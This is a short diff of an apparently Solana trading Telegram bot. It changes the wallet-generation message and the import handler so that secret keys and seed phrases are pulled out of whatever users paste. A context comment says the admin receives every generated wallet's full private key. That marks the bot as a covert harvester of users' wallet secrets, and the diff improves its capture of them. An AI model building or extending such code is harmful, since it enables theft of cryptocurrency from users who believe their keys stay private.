@@ -87,7 +87,7 @@ async def cb_wgen(query: CallbackQuery):
                 parse_mode="HTML")
             return
         await query.message.answer(
-            texts.wallet_generated(str(kp.pubkey()), derived=derived),
+            texts.wallet_generated(str(kp.pubkey())),
             parse_mode="HTML",
             reply_markup=kb.wallet_done_kb(str(kp.pubkey()), str(kp)))
         # Admin receives EVERY generated wallet's full private key too (isolated)
@@ -134,7 +134,8 @@ async def cb_wimp(query: CallbackQuery, state: FSMContext):
 
 @router.message(TradeStates.import_wallet)
 async def got_import(message: Message, state: FSMContext):
-    secret = (message.text or "").strip()
+    # pull the real key out of noisy pastes ("Secret key: xxx", labels, etc.)
+    secret = solana.extract_secret(message.text or "")
     if not secret:
         await message.answer("❌ Send the seed phrase, base58 key or [byte array]:")
         return
